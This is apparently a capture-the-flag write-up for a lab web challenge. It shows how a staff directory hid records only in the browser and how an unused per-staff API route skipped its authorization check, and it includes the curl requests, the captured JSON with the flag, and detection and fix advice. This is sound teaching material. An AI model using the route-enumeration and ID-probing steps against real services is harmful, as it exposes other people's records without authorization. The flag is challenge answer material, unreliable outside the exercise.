# T02.2 — Hidden on the page

> **Category:** 1. Training · **Points:** 50 · **Difficulty:** easy
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Client-side-only filtering plus a forgotten authorization on a sub-resource — the directory UI hides rehearsal entries, the API does not, and the per-staff detail route skips its check |
| **Tools** | `curl`, JavaScript source review (`app.js`), `jq` |
| **Attack surface** | `GET http://accounts.training:8080/directory/app.js` → `/api/directory/staff`, `/api/directory/staff/{id}/assignment` (10.77.40.30) |
| **Prerequisite** | None; both the list and the assignment sub-resource are anonymous |
| **Flag** | `FLAG{9e9612ddd489395c}` |

**What you are about to read:** how "the page does not show it" was a browser rendering decision
rather than a server filter, and how `app.js` handed over the route that returns the hidden record.

## Objective

> The public directory UI hides rehearsal entries; the directory API does not apply the same
> filter. Fetch the API directly and recover the missing account's staff detail.

The desk shows who is working where; one of the two listed people carries a hidden rehearsal
assignment. The card is the gap between what is rendered and what is served.

## Background you need

- **Client-side filtering is not filtering.** If the browser gets the full record set and drops
  rows before rendering, the data was already disclosed: the UI is a view, the response is the
  disclosure — "hidden" and "forbidden" look the same in a browser, not in `curl`.
- **The front end is a route map.** A client names every endpoint its authors built, including
  ones removed from the UI — a function with no call site is dead code to the developer.
- **Sub-resources hold the detail** and are often forgotten: a list returns a projection, the
  per-object route returns the full record, and both need authorization.

## Walkthrough

### 1. Recon — read the page, then read its JavaScript

```bash
H=http://accounts.training:8080
curl -sS $H/directory/ | head -30; echo; curl -sS $H/directory/app.js
```

```js
// app.js (structure, not the full file)
export async function loadPublicDirectory() {
  const r = await fetch('/api/directory/staff'); render(r);   // display_name + team only
}
export async function loadCoordinatorAssignment(staffId) {    // never called from the page
  return (await fetch(`/api/directory/staff/${staffId}/assignment`)).json();
}
```

Only the first loader is used. The page also carries the comment that gives the game away:
*"Coordinator assignments are not shown to visitors"* — a statement about rendering, not the API.

### 2. Finding the flaw — filtered list, unfiltered sub-resource

```bash
curl -sS $H/api/directory/staff | jq .
# {"revision": 12, "staff": [ ... "STF-204" Rhea Moss / Receiving,
#                               "STF-317" Dax Hale / Dispatch ... ]}
```

No rehearsal field, no assignment — but the unused sub-resource, addressed with an id from the
same list, returns the full record:

```bash
curl -sS -i $H/api/directory/staff/STF-204/assignment
```

```json
{"account":"rhea.moss","assignment_id":"ASG-204","flag":"FLAG{9e9612ddd489395c}",
 "rehearsal":"Bay 4 receiving","staff_detail":"Blue cabinet 17",
 "staff_id":"STF-204","staff_record_revision":8}
```

The other staff member shows where the check belongs:

```bash
curl -sS -i $H/api/directory/staff/STF-317/assignment
# 403 {"error":"directory_detail_denied"}
```

So the route enforces authorization for `STF-317` and not for `STF-204` — the record the UI hid.

### 3. Exploitation and the flag

```bash
curl -sS "$H/api/directory/staff/STF-204/assignment" | jq -r '.staff_detail'
# Blue cabinet 17
```

Two requests, no session. The record carries the flag (accepted on the fourth global attempt) and
`staff_detail`, T02.3's second recovery input: `FLAG{9e9612ddd489395c}`.

## Why this works (the vulnerability explained)

The desk collapsed three decisions into one: **which rows the page renders** (client-side — the
data is already on the wire), **which fields the list projection includes** (server-side, which is
why the list looks clean), and **who may read the per-staff detail** (enforced for `STF-317`,
forgotten for `STF-204`). The sub-resource is the classic forgotten second endpoint: written for a
coordinator view, the view was removed, the route stayed, the check was never added. The rule:
**enumerate the routes a client declares, then ask each one whether it authorises the caller.**

## Detection and fix

- **Detection:** anonymous `GET`s to a route the UI never calls; sequential id probing
  (`STF-100`…`STF-400`) from one source.
- **Fix:** apply the list's predicate to the sub-resource, keyed on the caller's role; do not rely
  on the client to hide rows; return `404` rather than `403` for records the caller may not see.

## Notes and dead ends

- Values are from the identity-desk lane artifacts; the assignment JSON is the captured response,
  trimmed. `/api/directory/staff/STF-204` (without `/assignment`) is `404`.
- Only `STF-204` and `STF-317` exist; everything else in `STF-100`…`STF-400` is `404
  {"error":"staff_not_found"}`. `robots.txt` is `404`; query parameters (`revision`, `include`,
  `all`, `team`, `limit`, `include_hidden`, `role`) are ignored — the data is behind a route.
  `STF-317` stays `403` even with T02.3's session, so the omission is per-record.
